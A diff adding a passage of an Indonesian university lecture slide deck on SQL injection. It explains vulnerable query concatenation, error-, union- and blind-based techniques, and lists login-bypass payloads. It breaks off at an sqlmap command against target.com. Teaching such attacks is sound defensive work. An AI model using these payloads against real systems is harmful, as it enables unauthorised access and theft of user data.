@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modul 12: SQL Injection - Pengantar Keamanan Siber</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/night.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/monokai.min.css">
+    <style>
+        :root {
+            --r-background-color: #1a1a2e;
+            --r-main-color: #eee;
+            --r-heading-color: #00d4ff;
+            --r-link-color: #ffd700;
+        }
+        .reveal h1, .reveal h2 { color: #00d4ff; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .reveal h3 { color: #ffd700; }
+        .reveal .slides section { text-align: left; }
+        .reveal .slides section.center { text-align: center; }
+        .center-content { text-align: center; }
+        .highlight-red { color: #ff6b6b; font-weight: bold; }
+        .highlight-green { color: #51cf66; font-weight: bold; }
+        .highlight-yellow { color: #ffd700; font-weight: bold; }
+        .highlight-blue { color: #00d4ff; font-weight: bold; }
+        .code-box {
+            background: #2d2d44;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            margin: 15px 0;
+            border-left: 4px solid #00d4ff;
+        }
+        .danger-box {
+            background: linear-gradient(135deg, #4a1a1a, #2d1a1a);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #ff6b6b;
+            margin: 15px 0;
+        }
+        .safe-box {
+            background: linear-gradient(135deg, #1a4a1a, #1a2d1a);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #51cf66;
+            margin: 15px 0;
+        }
+        .info-box {
+            background: linear-gradient(135deg, #1a3a4a, #1a2a3d);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #00d4ff;
+            margin: 15px 0;
+        }
+        .warning-box {
+            background: linear-gradient(135deg, #4a4a1a, #3d3d1a);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #ffd700;
+            margin: 15px 0;
+        }
+        .two-column {
+            display: flex;
+            gap: 30px;
+        }
+        .two-column > div {
+            flex: 1;
+        }
+        .icon-large {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        .step-box {
+            background: #2d2d44;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .step-number {
+            background: #00d4ff;
+            color: #1a1a2e;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+        .table-simple {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 0.85em;
+        }
+        .table-simple th {
+            background: #00d4ff;
+            color: #1a1a2e;
+            padding: 12px;
+            text-align: left;
+        }
+        .table-simple td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #3d3d5c;
+        }
+        .table-simple tr:nth-child(even) {
+            background: #2d2d44;
+        }
+        .analogy-box {
+            background: linear-gradient(135deg, #3d2d4a, #2d1d3a);
+            padding: 25px;
+            border-radius: 15px;
+            border: 2px solid #9b59b6;
+            margin: 20px 0;
+        }
+        .flow-arrow {
+            font-size: 2em;
+            color: #00d4ff;
+            margin: 0 10px;
+        }
+        .reveal ul { list-style-type: none; padding-left: 0; }
+        .reveal ul li { margin: 12px 0; padding-left: 30px; position: relative; }
+        .reveal ul li::before {
+            content: "▸";
+            color: #00d4ff;
+            position: absolute;
+            left: 0;
+        }
+        .fragment.current-visible.visible:not(.current-fragment) { display: none; }
+        .small-text { font-size: 0.75em; color: #aaa; }
+        .impact-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .impact-item {
+            background: #2d2d44;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .impact-item .icon { font-size: 2em; margin-bottom: 10px; }
+        .layer-defense {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .layer-box {
+            padding: 15px 20px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 0.8em;
+        }
+        .comparison-table {
+            display: flex;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .comparison-col {
+            flex: 1;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        .vs-badge {
+            background: #ffd700;
+            color: #1a1a2e;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            
+            <!-- SLIDE 1: Title -->
+            <section class="center">
+                <h1>🔓 SQL INJECTION</h1>
+                <h3>Modul 12 - Pengantar Keamanan Siber</h3>
+                <p style="margin-top: 40px;">
+                    <span class="highlight-blue">Universitas Pertahanan RI</span><br>
+                    <span class="small-text">Program Studi Informatika</span>
+                </p>
+                <p style="margin-top: 30px; font-size: 0.8em;">
+                    Tekan <span class="highlight-yellow">SPASI</span> atau <span class="highlight-yellow">→</span> untuk melanjutkan
+                </p>
+            </section>
+
+            <!-- SLIDE 2: Capaian Pembelajaran -->
+            <section>
+                <h2>🎯 Capaian Pembelajaran</h2>
+                <div class="info-box">
+                    <p><strong>CPMK 5:</strong> Mahasiswa mampu menganalisis serangan umum pada sistem, jaringan, dan aplikasi web serta merumuskan strategi mitigasinya.</p>
+                </div>
+                <h3 style="margin-top: 30px;">Sub-CPMK:</h3>
+                <ul>
+                    <li><span class="highlight-blue">5.16</span> - Menjelaskan konsep SQL injection</li>
+                    <li><span class="highlight-blue">5.17</span> - Mendemonstrasikan teknik SQL injection</li>
+                    <li><span class="highlight-blue">5.18</span> - Menjelaskan strategi mitigasi serangan SQL injection</li>
+                </ul>
+            </section>
+
+            <!-- SLIDE 3: Agenda -->
+            <section>
+                <h2>📋 Agenda Pembelajaran</h2>
+                <div class="two-column">
+                    <div>
+                        <div class="step-box">
+                            <div class="step-number">1</div>
+                            <div>Apa itu Database & SQL?</div>
+                        </div>
+                        <div class="step-box">
+                            <div class="step-number">2</div>
+                            <div>Konsep SQL Injection</div>
+                        </div>
+                        <div class="step-box">
+                            <div class="step-number">3</div>
+                            <div>Tipe-tipe SQL Injection</div>
+                        </div>
+                        <div class="step-box">
+                            <div class="step-number">4</div>
+                            <div>Teknik Bypass Login</div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="step-box">
+                            <div class="step-number">5</div>
+                            <div>Teknik Ekstraksi Data</div>
+                        </div>
+                        <div class="step-box">
+                            <div class="step-number">6</div>
+                            <div>Tools Pengujian</div>
+                        </div>
+                        <div class="step-box">
+                            <div class="step-number">7</div>
+                            <div>Strategi Mitigasi</div>
+                        </div>
+                        <div class="step-box">
+                            <div class="step-number">8</div>
+                            <div>Studi Kasus & Praktik</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- BAGIAN 1: DATABASE & SQL -->
+            <section>
+                <section class="center">
+                    <h1>📊 BAGIAN 1</h1>
+                    <h2>Database & SQL</h2>
+                    <p class="small-text">Fondasi untuk memahami SQL Injection</p>
+                </section>
+
+                <!-- Analogi Database -->
+                <section>
+                    <h2>🏛️ Apa itu Database?</h2>
+                    <div class="analogy-box">
+                        <p class="center-content icon-large">📚</p>
+                        <h3 class="center-content">Bayangkan Perpustakaan Besar</h3>
+                        <div class="two-column" style="margin-top: 20px;">
+                            <div>
+                                <p><strong>Perpustakaan:</strong></p>
+                                <ul>
+                                    <li>Ribuan buku tersusun di rak</li>
+                                    <li>Ada katalog untuk mencari</li>
+                                    <li>Dikelompokkan per kategori</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <p><strong>Database:</strong></p>
+                                <ul>
+                                    <li>Jutaan data tersimpan di server</li>
+                                    <li>Ada SQL untuk mencari</li>
+                                    <li>Dikelompokkan per tabel</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Struktur Database -->
+                <section>
+                    <h2>📋 Struktur Database</h2>
+                    <p>Database menyimpan data dalam bentuk <span class="highlight-blue">TABEL</span></p>
+                    <div class="code-box" style="background: #1a1a2e;">
+                        <p style="color: #00d4ff; margin-bottom: 10px;">Tabel: pengguna</p>
+                        <table class="table-simple">
+                            <tr>
+                                <th>id</th>
+                                <th>username</th>
+                                <th>password</th>
+                                <th>email</th>
+                            </tr>
+                            <tr>
+                                <td>1</td>
+                                <td>admin</td>
+                                <td>secret123</td>
+                                <td>admin@web.com</td>
+                            </tr>
+                            <tr>
+                                <td>2</td>
+                                <td>budi</td>
+                                <td>budi456</td>
+                                <td>budi@web.com</td>
+                            </tr>
+                            <tr>
+                                <td>3</td>
+                                <td>siti</td>
+                                <td>siti789</td>
+                                <td>siti@web.com</td>
+                            </tr>
+                        </table>
+                    </div>
+                    <p class="small-text">Setiap <span class="highlight-yellow">baris</span> = satu record data, Setiap <span class="highlight-yellow">kolom</span> = satu jenis informasi</p>
+                </section>
+
+                <!-- Apa itu SQL -->
+                <section>
+                    <h2>💬 Apa itu SQL?</h2>
+                    <div class="info-box">
+                        <p><strong>SQL</strong> = <span class="highlight-blue">Structured Query Language</span></p>
+                        <p>Bahasa untuk "berbicara" dengan database</p>
+                    </div>
+                    <div class="analogy-box" style="margin-top: 30px;">
+                        <p class="center-content">🗣️ <strong>Analogi:</strong></p>
+                        <p class="center-content" style="font-size: 1.1em;">
+                            Jika database adalah <span class="highlight-yellow">pelayan restoran</span>,<br>
+                            maka SQL adalah <span class="highlight-blue">bahasa untuk memesan makanan</span>
+                        </p>
+                    </div>
+                </section>
+
+                <!-- Perintah SQL Dasar -->
+                <section>
+                    <h2>⌨️ Perintah SQL Dasar</h2>
+                    <div class="two-column">
+                        <div>
+                            <div class="info-box">
+                                <p><strong>SELECT</strong> - Mengambil data</p>
+                                <code style="color: #51cf66;">SELECT * FROM pengguna</code>
+                                <p class="small-text">"Ambilkan semua data pengguna"</p>
+                            </div>
+                            <div class="info-box">
+                                <p><strong>INSERT</strong> - Menambah data</p>
+                                <code style="color: #51cf66;">INSERT INTO pengguna VALUES (...)</code>
+                                <p class="small-text">"Tambahkan pengguna baru"</p>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="info-box">
+                                <p><strong>UPDATE</strong> - Mengubah data</p>
+                                <code style="color: #51cf66;">UPDATE pengguna SET ...</code>
+                                <p class="small-text">"Ubah data pengguna"</p>
+                            </div>
+                            <div class="info-box">
+                                <p><strong>DELETE</strong> - Menghapus data</p>
+                                <code style="color: #51cf66;">DELETE FROM pengguna</code>
+                                <p class="small-text">"Hapus data pengguna"</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- WHERE Clause -->
+                <section>
+                    <h2>🔍 Kondisi WHERE</h2>
+                    <p>WHERE digunakan untuk <span class="highlight-yellow">memfilter</span> data yang diambil</p>
+                    <div class="code-box">
+                        <p style="color: #888;">-- Ambil SEMUA pengguna</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> pengguna</p>
+                        <br>
+                        <p style="color: #888;">-- Ambil pengguna dengan username 'admin'</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> pengguna <span class="highlight-yellow">WHERE</span> username = <span class="highlight-green">'admin'</span></p>
+                        <br>
+                        <p style="color: #888;">-- Cek login: username DAN password harus cocok</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> pengguna</p>
+                        <p><span class="highlight-yellow">WHERE</span> username = <span class="highlight-green">'admin'</span> <span class="highlight-red">AND</span> password = <span class="highlight-green">'secret123'</span></p>
+                    </div>
+                </section>
+
+                <!-- Komentar SQL -->
+                <section>
+                    <h2>💭 Komentar dalam SQL</h2>
+                    <p>Komentar adalah teks yang <span class="highlight-red">DIABAIKAN</span> oleh database</p>
+                    <div class="code-box">
+                        <p style="color: #888;">-- Ini komentar satu baris (diabaikan)</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> pengguna <span style="color: #888;">-- sisanya diabaikan</span></p>
+                        <br>
+                        <p style="color: #888;">/* Ini komentar</p>
+                        <p style="color: #888;">   multi baris */</p>
+                    </div>
+                    <div class="warning-box" style="margin-top: 20px;">
+                        <p>⚠️ <strong>Penting!</strong></p>
+                        <p>Tanda komentar (<code>--</code>) akan digunakan dalam serangan SQL Injection untuk menonaktifkan bagian query!</p>
+                    </div>
+                </section>
+            </section>
+
+            <!-- BAGIAN 2: KONSEP SQL INJECTION -->
+            <section>
+                <section class="center">
+                    <h1>💉 BAGIAN 2</h1>
+                    <h2>Konsep SQL Injection</h2>
+                    <p class="small-text">Memahami bagaimana serangan ini bekerja</p>
+                </section>
+
+                <!-- Definisi -->
+                <section>
+                    <h2>❓ Apa itu SQL Injection?</h2>
+                    <div class="danger-box">
+                        <p class="center-content icon-large">💉</p>
+                        <p class="center-content" style="font-size: 1.2em;">
+                            <strong>SQL Injection</strong> adalah teknik serangan yang<br>
+                            <span class="highlight-red">menyisipkan kode SQL berbahaya</span><br>
+                            ke dalam input aplikasi
+                        </p>
+                    </div>
+                    <div class="analogy-box" style="margin-top: 20px;">
+                        <p>🎭 <strong>Analogi Sederhana:</strong></p>
+                        <p>Seperti mengisi formulir lamaran kerja dengan perintah:<br>
+                        <code class="highlight-red">"Nama: Ahmad; TERIMA SAYA SEBAGAI DIREKTUR"</code></p>
+                    </div>
+                </section>
+
+                <!-- Mengapa Terjadi -->
+                <section>
+                    <h2>🤔 Mengapa SQL Injection Terjadi?</h2>
+                    <p>Karena aplikasi <span class="highlight-red">menggabungkan</span> input pengguna langsung ke query SQL</p>
+                    <div class="code-box">
+                        <p style="color: #888;">// Kode aplikasi (BERBAHAYA!)</p>
+                        <p>query = <span class="highlight-green">"SELECT * FROM pengguna WHERE username='"</span></p>
+                        <p>        + <span class="highlight-red">input_user</span></p>
+                        <p>        + <span class="highlight-green">"' AND password='"</span></p>
+                        <p>        + <span class="highlight-red">input_password</span></p>
+                        <p>        + <span class="highlight-green">"'"</span></p>
+                    </div>
+                    <div class="fragment">
+                        <p style="margin-top: 20px;">Jika pengguna memasukkan input normal: <code class="highlight-green">admin</code></p>
+                        <p>Query menjadi: <code>WHERE username='admin' AND password='xxx'</code> ✅</p>
+                    </div>
+                </section>
+
+                <!-- Serangan Terjadi -->
+                <section>
+                    <h2>⚡ Ketika Serangan Terjadi</h2>
+                    <p>Penyerang memasukkan input <span class="highlight-red">berbahaya</span>:</p>
+                    <div class="danger-box">
+                        <p>Username: <code class="highlight-red">admin'--</code></p>
+                        <p>Password: <code>apapun</code></p>
+                    </div>
+                    <div class="fragment">
+                        <p style="margin-top: 20px;">Query yang terbentuk:</p>
+                        <div class="code-box">
+                            <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> pengguna</p>
+                            <p><span class="highlight-yellow">WHERE</span> username=<span class="highlight-green">'admin'</span><span class="highlight-red">--</span><span style="color: #666;">' AND password='apapun'</span></p>
+                        </div>
+                        <p class="small-text">Bagian setelah <code>--</code> menjadi komentar dan <span class="highlight-red">DIABAIKAN!</span></p>
+                    </div>
+                </section>
+
+                <!-- Visual: Normal vs Attack -->
+                <section>
+                    <h2>⚔️ Normal vs Serangan</h2>
+                    <div class="comparison-table">
+                        <div class="comparison-col" style="background: linear-gradient(135deg, #1a4a1a, #1a2d1a);">
+                            <p class="center-content"><span class="vs-badge">✅ NORMAL</span></p>
+                            <p><strong>Input:</strong></p>
+                            <p>User: <code>admin</code></p>
+                            <p>Pass: <code>secret123</code></p>
+                            <hr style="border-color: #51cf66;">
+                            <p><strong>Query:</strong></p>
+                            <code style="font-size: 0.75em;">WHERE user='admin' AND pass='secret123'</code>
+                            <hr style="border-color: #51cf66;">
+                            <p><strong>Hasil:</strong> 1 user (jika cocok)</p>
+                        </div>
+                        <div class="comparison-col" style="background: linear-gradient(135deg, #4a1a1a, #2d1a1a);">
+                            <p class="center-content"><span class="vs-badge" style="background: #ff6b6b;">⚠️ SERANGAN</span></p>
+                            <p><strong>Input:</strong></p>
+                            <p>User: <code class="highlight-red">admin'--</code></p>
+                            <p>Pass: <code>apapun</code></p>
+                            <hr style="border-color: #ff6b6b;">
+                            <p><strong>Query:</strong></p>
+                            <code style="font-size: 0.75em;">WHERE user='admin'<span class="highlight-red">--</span><span style="color:#666;">..diabaikan..</span></code>
+                            <hr style="border-color: #ff6b6b;">
+                            <p><strong>Hasil:</strong> <span class="highlight-red">Login tanpa password!</span></p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Titik Masuk -->
+                <section>
+                    <h2>🚪 Titik Masuk Serangan</h2>
+                    <p>Di mana saja SQL Injection bisa dilakukan?</p>
+                    <div class="impact-grid">
+                        <div class="impact-item">
+                            <div class="icon">📝</div>
+                            <p><strong>Form Input</strong></p>
+                            <p class="small-text">Login, pendaftaran, pencarian, komentar</p>
+                        </div>
+                        <div class="impact-item">
+                            <div class="icon">🔗</div>
+                            <p><strong>URL Parameter</strong></p>
+                            <p class="small-text">?id=1, ?kategori=buku, ?page=2</p>
+                        </div>
+                        <div class="impact-item">
+                            <div class="icon">🍪</div>
+                            <p><strong>Cookie</strong></p>
+                            <p class="small-text">Session ID, preferensi user</p>
+                        </div>
+                        <div class="impact-item">
+                            <div class="icon">📨</div>
+                            <p><strong>HTTP Headers</strong></p>
+                            <p class="small-text">User-Agent, Referer</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Dampak -->
+                <section>
+                    <h2>💥 Dampak SQL Injection</h2>
+                    <div class="impact-grid">
+                        <div class="impact-item" style="background: #4a1a1a;">
+                            <div class="icon">🔓</div>
+                            <p><strong>Bypass Login</strong></p>
+                            <p class="small-text">Masuk tanpa password, akses sebagai admin</p>
+                        </div>
+                        <div class="impact-item" style="background: #4a3a1a;">
+                            <div class="icon">📊</div>
+                            <p><strong>Pencurian Data</strong></p>
+                            <p class="small-text">Data pribadi, password, kartu kredit</p>
+                        </div>
+                        <div class="impact-item" style="background: #1a3a4a;">
+                            <div class="icon">✏️</div>
+                            <p><strong>Manipulasi Data</strong></p>
+                            <p class="small-text">Ubah saldo, ubah nilai, ubah harga</p>
+                        </div>
+                        <div class="impact-item" style="background: #3a1a4a;">
+                            <div class="icon">🗑️</div>
+                            <p><strong>Penghapusan Data</strong></p>
+                            <p class="small-text">DROP TABLE, DELETE semua record</p>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- BAGIAN 3: TIPE-TIPE SQL INJECTION -->
+            <section>
+                <section class="center">
+                    <h1>📚 BAGIAN 3</h1>
+                    <h2>Tipe-Tipe SQL Injection</h2>
+                    <p class="small-text">Berbagai teknik yang digunakan penyerang</p>
+                </section>
+
+                <!-- Overview Tipe -->
+                <section>
+                    <h2>🗂️ Klasifikasi SQL Injection</h2>
+                    <div class="info-box">
+                        <table class="table-simple">
+                            <tr>
+                                <th>Tipe</th>
+                                <th>Cara Kerja</th>
+                                <th>Kesulitan</th>
+                            </tr>
+                            <tr>
+                                <td><span class="highlight-blue">In-Band</span></td>
+                                <td>Hasil langsung terlihat di halaman</td>
+                                <td>⭐ Mudah</td>
+                            </tr>
+                            <tr>
+                                <td><span class="highlight-yellow">Blind</span></td>
+                                <td>Hasil tidak terlihat, harus "menebak"</td>
+                                <td>⭐⭐ Sedang</td>
+                            </tr>
+                            <tr>
+                                <td><span class="highlight-red">Out-of-Band</span></td>
+                                <td>Data dikirim ke server lain</td>
+                                <td>⭐⭐⭐ Sulit</td>
+                            </tr>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- In-Band: Error-Based -->
+                <section>
+                    <h2>🔴 In-Band: Error-Based</h2>
+                    <p>Memanfaatkan <span class="highlight-red">pesan error</span> untuk mendapatkan informasi</p>
+                    <div class="code-box">
+                        <p style="color: #888;">-- Payload yang menyebabkan error</p>
+                        <p>Input: <span class="highlight-red">' AND 1=CONVERT(int, @@version)--</span></p>
+                    </div>
+                    <div class="fragment">
+                        <div class="danger-box" style="margin-top: 20px;">
+                            <p>❌ <strong>Pesan Error:</strong></p>
+                            <code style="color: #ff6b6b;">Conversion failed when converting 'Microsoft SQL Server 2019' to int</code>
+                        </div>
+                        <p class="highlight-green">✓ Penyerang tahu versi database!</p>
+                    </div>
+                </section>
+
+                <!-- In-Band: Union-Based -->
+                <section>
+                    <h2>🟠 In-Band: Union-Based</h2>
+                    <p>Menggunakan <span class="highlight-yellow">UNION</span> untuk menggabungkan hasil query</p>
+                    <div class="code-box">
+                        <p style="color: #888;">-- Query asli untuk menampilkan produk</p>
+                        <p><span class="highlight-blue">SELECT</span> nama, harga <span class="highlight-blue">FROM</span> produk <span class="highlight-yellow">WHERE</span> id = <span class="highlight-red">1</span></p>
+                        <br>
+                        <p style="color: #888;">-- Payload penyerang</p>
+                        <p><span class="highlight-blue">SELECT</span> nama, harga <span class="highlight-blue">FROM</span> produk <span class="highlight-yellow">WHERE</span> id = <span class="highlight-red">1</span></p>
+                        <p><span class="highlight-red">UNION SELECT username, password FROM pengguna--</span></p>
+                    </div>
+                    <div class="fragment">
+                        <p style="margin-top: 15px;">Hasil di halaman:</p>
+                        <table class="table-simple" style="font-size: 0.8em;">
+                            <tr><th>Nama</th><th>Harga</th></tr>
+                            <tr><td>Laptop Gaming</td><td>15000000</td></tr>
+                            <tr style="background: #4a1a1a;"><td class="highlight-red">admin</td><td class="highlight-red">secret123</td></tr>
+                            <tr style="background: #4a1a1a;"><td class="highlight-red">budi</td><td class="highlight-red">budi456</td></tr>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- Blind: Boolean-Based -->
+                <section>
+                    <h2>🟡 Blind: Boolean-Based</h2>
+                    <p>Mengamati <span class="highlight-yellow">perbedaan respons</span> untuk TRUE/FALSE</p>
+                    <div class="two-column">
+                        <div class="safe-box">
+                            <p class="center-content"><strong>Jika TRUE</strong></p>
+                            <code style="font-size: 0.8em;">id=1 AND 1=1</code>
+                            <p style="margin-top: 10px;">Halaman: "Produk ditemukan"</p>
+                        </div>
+                        <div class="danger-box">
+                            <p class="center-content"><strong>Jika FALSE</strong></p>
+                            <code style="font-size: 0.8em;">id=1 AND 1=2</code>
+                            <p style="margin-top: 10px;">Halaman: "Tidak ditemukan"</p>
+                        </div>
+                    </div>
+                    <div class="fragment">
+                        <div class="info-box" style="margin-top: 20px;">
+                            <p>💡 <strong>Teknik Ekstraksi:</strong></p>
+                            <code style="font-size: 0.8em;">id=1 AND SUBSTRING(password,1,1)='a'</code>
+                            <p class="small-text">Jika halaman normal → karakter pertama password adalah 'a'</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Blind: Time-Based -->
+                <section>
+                    <h2>🟣 Blind: Time-Based</h2>
+                    <p>Mengukur <span class="highlight-blue">waktu respons</span> untuk menentukan TRUE/FALSE</p>
+                    <div class="code-box">
+                        <p style="color: #888;">-- Jika karakter pertama = 'a', tunggu 5 detik</p>
+                        <p>id=1; <span class="highlight-red">IF</span>(SUBSTRING(password,1,1)='a')</p>
+                        <p>      <span class="highlight-yellow">WAITFOR DELAY '0:0:5'</span></p>
+                    </div>
+                    <div class="two-column" style="margin-top: 20px;">
+                        <div class="safe-box">
+                            <p class="center-content">⏱️ <strong>5 detik delay</strong></p>
+                            <p class="center-content">= Kondisi TRUE</p>
+                            <p class="center-content small-text">Karakter = 'a' ✓</p>
+                        </div>
+                        <div class="danger-box">
+                            <p class="center-content">⚡ <strong>Respons cepat</strong></p>
+                            <p class="center-content">= Kondisi FALSE</p>
+                            <p class="center-content small-text">Karakter ≠ 'a' ✗</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Perbandingan Tipe -->
+                <section>
+                    <h2>📊 Perbandingan Tipe SQLi</h2>
+                    <table class="table-simple">
+                        <tr>
+                            <th>Aspek</th>
+                            <th>In-Band</th>
+                            <th>Blind</th>
+                        </tr>
+                        <tr>
+                            <td>Hasil terlihat?</td>
+                            <td class="highlight-green">Ya, langsung</td>
+                            <td class="highlight-red">Tidak</td>
+                        </tr>
+                        <tr>
+                            <td>Kecepatan</td>
+                            <td class="highlight-green">Cepat</td>
+                            <td class="highlight-red">Lambat (per karakter)</td>
+                        </tr>
+                        <tr>
+                            <td>Jumlah request</td>
+                            <td>Sedikit</td>
+                            <td>Ratusan - ribuan</td>
+                        </tr>
+                        <tr>
+                            <td>Deteksi</td>
+                            <td>Lebih mudah</td>
+                            <td>Lebih sulit</td>
+                        </tr>
+                        <tr>
+                            <td>Bahaya</td>
+                            <td class="highlight-red">Tinggi</td>
+                            <td class="highlight-red">Tinggi (sama)</td>
+                        </tr>
+                    </table>
+                </section>
+            </section>
+
+            <!-- BAGIAN 4: TEKNIK BYPASS -->
+            <section>
+                <section class="center">
+                    <h1>🔓 BAGIAN 4</h1>
+                    <h2>Teknik Bypass Authentication</h2>
+                    <p class="small-text">Cara penyerang melewati halaman login</p>
+                </section>
+
+                <!-- Proses Login Normal -->
+                <section>
+                    <h2>🔐 Proses Login Normal</h2>
+                    <div class="step-box">
+                        <div class="step-number">1</div>
+                        <div>User memasukkan username & password</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number">2</div>
+                        <div>Aplikasi membuat query SQL untuk verifikasi</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number">3</div>
+                        <div>Database mengecek apakah data cocok</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number">4</div>
+                        <div>Jika cocok → Login berhasil</div>
+                    </div>
+                    <div class="code-box" style="margin-top: 20px;">
+                        <p style="color: #888;">-- Query login normal</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> users</p>
+                        <p><span class="highlight-yellow">WHERE</span> username=<span class="highlight-green">'admin'</span> <span class="highlight-red">AND</span> password=<span class="highlight-green">'secret'</span></p>
+                    </div>
+                </section>
+
+                <!-- Payload Bypass #1 -->
+                <section>
+                    <h2>💉 Payload Bypass #1: Komentar</h2>
+                    <div class="danger-box">
+                        <p><strong>Input:</strong></p>
+                        <p>Username: <code class="highlight-red">admin'--</code></p>
+                        <p>Password: <code>apapun (tidak penting)</code></p>
+                    </div>
+                    <div class="code-box" style="margin-top: 20px;">
+                        <p style="color: #888;">-- Query yang terbentuk</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> users</p>
+                        <p><span class="highlight-yellow">WHERE</span> username=<span class="highlight-green">'admin'</span><span class="highlight-red">--</span><span style="color: #666;">' AND password='apapun'</span></p>
+                    </div>
+                    <div class="safe-box" style="margin-top: 15px;">
+                        <p>✅ <strong>Hasil:</strong> Login sebagai admin <span class="highlight-red">TANPA password!</span></p>
+                        <p class="small-text">Karena pengecekan password dijadikan komentar</p>
+                    </div>
+                </section>
+
+                <!-- Payload Bypass #2 -->
+                <section>
+                    <h2>💉 Payload Bypass #2: OR TRUE</h2>
+                    <div class="danger-box">
+                        <p><strong>Input:</strong></p>
+                        <p>Username: <code class="highlight-red">' OR '1'='1</code></p>
+                        <p>Password: <code class="highlight-red">' OR '1'='1</code></p>
+                    </div>
+                    <div class="code-box" style="margin-top: 20px;">
+                        <p style="color: #888;">-- Query yang terbentuk</p>
+                        <p><span class="highlight-blue">SELECT</span> * <span class="highlight-blue">FROM</span> users</p>
+                        <p><span class="highlight-yellow">WHERE</span> username=<span class="highlight-green">''</span> <span class="highlight-red">OR '1'='1'</span></p>
+                        <p><span class="highlight-red">AND</span> password=<span class="highlight-green">''</span> <span class="highlight-red">OR '1'='1'</span></p>
+                    </div>
+                    <div class="info-box" style="margin-top: 15px;">
+                        <p>💡 Karena <code>'1'='1'</code> selalu <span class="highlight-green">TRUE</span>,</p>
+                        <p>Query mengembalikan <span class="highlight-red">SEMUA user</span> dalam database!</p>
+                    </div>
+                </section>
+
+                <!-- Daftar Payload Umum -->
+                <section>
+                    <h2>📋 Payload Bypass Umum</h2>
+                    <table class="table-simple">
+                        <tr>
+                            <th>Payload</th>
+                            <th>Fungsi</th>
+                        </tr>
+                        <tr>
+                            <td><code>' OR '1'='1</code></td>
+                            <td>Kondisi selalu TRUE</td>
+                        </tr>
+                        <tr>
+                            <td><code>admin'--</code></td>
+                            <td>Nonaktifkan cek password</td>
+                        </tr>
+                        <tr>
+                            <td><code>' OR 1=1#</code></td>
+                            <td>Variasi untuk MySQL</td>
+                        </tr>
+                        <tr>
+                            <td><code>') OR ('1'='1</code></td>
+                            <td>Untuk query dengan kurung</td>
+                        </tr>
+                        <tr>
+                            <td><code>' OR ''='</code></td>
+                            <td>Kondisi string kosong</td>
+                        </tr>
+                        <tr>
+                            <td><code>admin'/*</code></td>
+                            <td>Komentar multi-baris</td>
+                        </tr>
+                    </table>
+                </section>
+            </section>
+
+            <!-- BAGIAN 5: TOOLS -->
+            <section>
+                <section class="center">
+                    <h1>🔧 BAGIAN 5</h1>
+                    <h2>Tools Pengujian</h2>
+                    <p class="small-text">Alat bantu untuk ethical hacking</p>
+                </section>
+
+                <!-- SQLMap -->
+                <section>
+                    <h2>🗡️ SQLMap</h2>
+                    <div class="info-box">
+                        <p>Tool <span class="highlight-blue">otomatis</span> paling populer untuk SQL Injection</p>
+                    </div>
+                    <div class="code-box" style="margin-top: 20px;">
+                        <p style="color: #888;"># Deteksi kerentanan</p>
+                        <p>sqlmap -u <span class="highlight-green">"http://target.com/page?id=1"</span></p>
+                        <br>
